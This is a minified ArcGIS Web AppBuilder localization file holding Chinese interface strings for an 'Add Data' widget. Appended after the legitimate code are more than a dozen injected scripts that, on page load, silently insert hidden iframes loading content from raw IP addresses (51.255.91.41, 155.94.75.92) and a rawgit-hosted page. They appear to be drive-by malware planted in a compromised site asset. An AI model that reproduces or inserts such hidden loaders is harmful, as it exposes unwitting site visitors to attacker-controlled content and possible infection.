// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/AddData/nls/strings":{_widgetLabel:"\u6dfb\u52a0\u6570\u636e",noOptionsConfigured:"\u5c1a\u672a\u914d\u7f6e\u4efb\u4f55\u9009\u9879\u3002",tabs:{search:"\u641c\u7d22",url:"URL",file:"\u6587\u4ef6"},search:{featureLayerTitlePattern:"{serviceName} - {layerName}",layerInaccessible:"\u56fe\u5c42\u4e0d\u53ef\u8bbf\u95ee\u3002",loadError:"\u6dfb\u52a0\u6570\u636e\uff0c\u65e0\u6cd5\u52a0\u8f7d:",searchBox:{search:"\u641c\u7d22",placeholder:"\u641c\u7d22..."},bboxOption:{bbox:"\u5730\u56fe\u5185"},
scopeOptions:{anonymousContent:"\u5185\u5bb9",myContent:"\u6211\u7684\u5185\u5bb9",myOrganization:"\u6211\u7684\u7ec4\u7ec7",curated:"\u76d1\u7ba1",ArcGISOnline:"ArcGIS Online"},sortOptions:{prompt:"\u6392\u5e8f\u65b9\u5f0f:",relevance:"\u76f8\u5173\u5ea6",title:"\u6807\u9898",owner:"\u6240\u6709\u8005",rating:"\u8bc4\u7ea7",views:"\u67e5\u770b\u6b21\u6570",date:"\u65e5\u671f",switchOrder:"\u5207\u6362"},typeOptions:{prompt:"\u7c7b\u578b",mapService:"\u5730\u56fe\u670d\u52a1",featureService:"\u8981\u7d20\u670d\u52a1",
imageService:"\u5f71\u50cf\u670d\u52a1",vectorTileService:"\u77e2\u91cf\u5207\u7247\u670d\u52a1",kml:"KML",wms:"WMS"},resultsPane:{noMatch:"\u672a\u627e\u5230\u4efb\u4f55\u7ed3\u679c\u3002"},paging:{first:"\x3c\x3c",firstTip:"\u7b2c\u4e00\u9875",previous:"\x3c",previousTip:"\u4e0a\u4e00\u9875",next:"\x3e",nextTip:"\u4e0b\u4e00\u9875",pagePattern:"{page}"},resultCount:{countPattern:"{count} {type}",itemSingular:"\u9879\u76ee",itemPlural:"\u9879\u76ee"},item:{actions:{add:"\u6dfb\u52a0",close:"\u5173\u95ed",
remove:"\u79fb\u9664",details:"\u8be6\u7ec6\u4fe1\u606f",done:"\u5b8c\u6210",editName:"\u7f16\u8f91\u540d\u79f0"},messages:{adding:"\u6b63\u5728\u6dfb\u52a0...",removing:"\u6b63\u5728\u79fb\u9664...",added:"\u5df2\u6dfb\u52a0",addFailed:"\u6dfb\u52a0\u5931\u8d25",unsupported:"\u4e0d\u652f\u6301\u7684"},typeByOwnerPattern:"{type}\uff0c\u6240\u6709\u8005 {owner}",dateFormat:"yyyy/m/d",datePattern:"{date}",ratingsCommentsViewsPattern:"{ratings} {ratingsIcon} {comments} {commentsIcon} {views} {viewsIcon}",
ratingsCommentsViewsLabels:{ratings:'"\u8bc4\u7ea7"\uff0c"\u8bc4\u8bba": "\u8bc4\u8bba"\uff0c"\u67e5\u770b": "\u67e5\u770b"'},types:{"Map Service":"\u5730\u56fe\u670d\u52a1","Feature Service":"\u8981\u7d20\u670d\u52a1","Image Service":"\u5f71\u50cf\u670d\u52a1","Vector Tile Service":"\u77e2\u91cf\u5207\u7247\u670d\u52a1",WMS:"WMS",KML:"KML"}}},addFromUrl:{type:"\u7c7b\u578b",url:"URL",types:{ArcGIS:"ArcGIS Server Web \u670d\u52a1",WMS:"WMS OGC Web \u670d\u52a1",WMTS:"WMTS OGC Web \u670d\u52a1",WFS:"WFS OGC Web \u670d\u52a1",
KML:"KML \u6587\u4ef6",GeoRSS:"GeoRSS \u6587\u4ef6",CSV:"CSV \u6587\u4ef6"},samplesHint:"\u7b80\u5355 URL"},addFromFile:{intro:"\u60a8\u53ef\u4ee5\u653e\u7f6e\u6216\u6d4f\u89c8\u4ee5\u4e0b\u4efb\u4e00\u6587\u4ef6\u7c7b\u578b\uff1a",types:{Shapefile:"Shapefile (.zip \u5305\u542b\u6240\u6709 shapefile \u6587\u4ef6\u7684 ZIP \u5f52\u6863)",CSV:"CSV \u6587\u4ef6(.csv\uff0c\u542b\u5730\u5740\u6216\u7ecf\u5ea6\u3001\u7eac\u5ea6\uff0c\u4ee5\u9017\u53f7\u3001\u5206\u53f7\u6216\u5236\u8868\u7b26\u5206\u9694)",
KML:"KML \u6587\u4ef6(.kml)",GPX:"GPX \u6587\u4ef6(.gpx\uff0cGPS \u4ea4\u6362\u683c\u5f0f)",GeoJSON:"GeoJSON \u6587\u4ef6(.geo.json \u6216 .geojson)"},generalizeOn:"\u6982\u5316\u8981\u7d20\u4ee5\u4fbf\u4e8e web \u663e\u793a",dropOrBrowse:"\u653e\u7f6e\u6216\u6d4f\u89c8",browse:"\u6d4f\u89c8",invalidType:"\u6b64\u6587\u4ef6\u7c7b\u578b\u4e0d\u53d7\u652f\u6301\u3002",addingPattern:"{filename}\uff1a\u6b63\u5728\u6dfb\u52a0...",addFailedPattern:"{filename}\uff1a\u6dfb\u52a0\u5931\u8d25",featureCountPattern:"{filename}\uff1a{count} \u4e2a\u8981\u7d20",
invalidTypePattern:"{filename}\uff1a\u6b64\u7c7b\u578b\u4e0d\u53d7\u652f\u6301",maxFeaturesAllowedPattern:"\u5141\u8bb8\u6700\u591a {count} \u4e2a\u8981\u7d20",layerNamePattern:"{filename} - {name}"},layerList:{caption:"\u56fe\u5c42",noLayersAdded:"\u5c1a\u672a\u6dfb\u52a0\u4efb\u4f55\u56fe\u5c42\u3002",removeLayer:"\u79fb\u9664\u56fe\u5c42",back:"\u8fd4\u56de"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});